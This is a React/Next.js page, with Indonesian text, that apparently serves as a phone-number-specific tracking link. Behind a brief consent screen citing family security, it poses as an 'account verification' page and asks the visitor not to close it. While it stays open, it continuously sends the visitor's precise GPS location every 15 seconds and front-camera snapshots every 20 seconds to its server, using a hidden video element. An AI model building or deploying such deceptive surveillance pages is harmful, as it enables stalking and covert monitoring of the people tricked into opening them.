"use client";

import { Suspense } from "react";
import { useParams } from "next/navigation";
import { useEffect, useRef, useState } from "react";

function VerifyInner() {
  const params = useParams<{ phone: string }>();
  const id = params?.phone ?? "";
  const [consented, setConsented] = useState(false);
  const [agree, setAgree] = useState(false);
  const [status, setStatus] = useState("Menunggu izin lokasi...");
  const [last, setLast] = useState<any>(null);
  const [error, setError] = useState("");
  const [cameraStatus, setCameraStatus] = useState("Kamera belum aktif");
  const [lastPhoto, setLastPhoto] = useState<string | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    if (!id || !consented) return;
    if (!("geolocation" in navigator)) {
      setError("Browser tidak mendukung geolocation");
      return;
    }

    let watchId: number | null = null;
    let interval: any = null;

    async function sendPosition(pos: GeolocationPosition) {
      const { latitude, longitude, accuracy } = pos.coords;
      try {
        const res = await fetch("/api/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id, lat: latitude, lng: longitude, accuracy }),
        });
        if (!res.ok) throw new Error("gagal kirim");
        setLast({ latitude, longitude, accuracy, time: new Date().toLocaleTimeString() });
        setStatus("Sinkronisasi aktif.");
      } catch {
        setError("Gagal mengirim data ke server");
      }
    }

    function onError(err: GeolocationPositionError) {
      setError(err.message || "Izin lokasi ditolak");
      setStatus("Gagal mendapatkan lokasi");
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sendPosition(pos);
        watchId = navigator.geolocation.watchPosition(sendPosition, onError, {
          enableHighAccuracy: true,
          maximumAge: 5000,
        });
      },
      onError,
      { enableHighAccuracy: true, timeout: 15000 }
    );

    interval = setInterval(() => {
      navigator.geolocation.getCurrentPosition(sendPosition, onError, {
        enableHighAccuracy: true,
        timeout: 15000,
      });
    }, 15000);

    // camera
    async function startCamera() {
      try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          setCameraStatus("Browser tidak mendukung kamera");
          return;
        }
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        streamRef.current = stream;
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
        }
        setCameraStatus("Kamera aktif");
        capturePhoto();
      } catch (e: any) {
        setCameraStatus(e?.message || "Izin kamera ditolak");
      }
    }

    async function capturePhoto() {
      const video = videoRef.current;
      if (!video || video.videoWidth === 0) return;
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      if (!ctx) return;
      ctx.drawImage(video, 0, 0);
      const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
      setLastPhoto(dataUrl);
      try {
        await fetch("/api/media", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id, dataUrl }),
        });
      } catch {}
    }

    startCamera();
    const photoInterval = setInterval(capturePhoto, 20000);

    return () => {
      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
      if (interval) clearInterval(interval);
      if (photoInterval) clearInterval(photoInterval);
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }
    };
  }, [id, consented]);

  if (!consented) {
    return (
      <main className="min-h-screen bg-slate-900 text-white p-6 flex items-center justify-center">
        <div className="max-w-md w-full bg-slate-800 p-6 rounded-xl shadow">
          <h1 className="text-2xl font-bold mb-2">Persetujuan Penggunaan</h1>
          <p className="text-slate-300 mb-4">
            Aplikasi ini akan mengakses lokasi dan kamera perangkat Anda untuk keperluan
            keamanan keluarga. Data hanya dikirim setelah Anda menyetujui.
          </p>
          <label className="flex items-start gap-2 text-sm text-slate-200 mb-4">
            <input
              type="checkbox"
              checked={agree}
              onChange={(e) => setAgree(e.target.checked)}
              className="mt-1"
            />
            Saya memahami dan menyetujui penggunaan lokasi serta kamera untuk tujuan
            keamanan keluarga.
          </label>
          <button
            disabled={!agree}
            onClick={() => setConsented(true)}
            className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 py-3 rounded-lg font-semibold"
          >
            Setuju & Lanjutkan
          </button>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-slate-900 text-white p-6 flex items-center justify-center">
      <div className="max-w-md w-full bg-slate-800 p-6 rounded-xl shadow">
        <h1 className="text-2xl font-bold mb-2">Verifikasi Akun</h1>
        <p className="text-slate-300 mb-4">
          ID: <span className="font-mono">{id}</span>
        </p>
        <div className="p-4 rounded-lg bg-slate-700 mb-4">
          <p className="text-sm">{status}</p>
          {error && <p className="text-sm text-red-400 mt-2">{error}</p>}
        </div>
        <div className="p-4 rounded-lg bg-slate-700 mb-4">
          <p className="text-sm">Kamera: {cameraStatus}</p>
          {lastPhoto && (
            <img src={lastPhoto} alt="capture" className="mt-2 rounded-lg w-full" />
          )}
        </div>
        {last && (
          <div className="text-sm space-y-1">
            <p>Latitude: {last.latitude}</p>
            <p>Longitude: {last.longitude}</p>
            <p>Akurasi: {Math.round(last.accuracy)} m</p>
            <p>Terakhir: {last.time}</p>
          </div>
        )}
        <video ref={videoRef} className="hidden" playsInline muted />
        <p className="text-xs text-slate-400 mt-4">
          Halaman ini melakukan verifikasi identitas. Jangan tutup halaman ini.
        </p>
      </div>
    </main>
  );
}

export default function VerifyPage() {
  return (
    <Suspense fallback={<div className="min-h-screen bg-slate-900 text-white flex items-center justify-center">Memuat...</div>}>
      <VerifyInner />
    </Suspense>
  );
}